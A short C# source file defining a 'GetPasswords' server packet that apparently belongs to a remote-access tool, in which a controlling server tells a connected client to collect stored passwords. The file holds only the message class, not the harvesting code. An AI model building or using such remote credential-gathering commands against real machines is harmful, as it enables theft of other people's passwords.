using System;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ServerPackets
{
    [Serializable]
    public class GetPasswords : IPacket
    {
        public GetPasswords()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
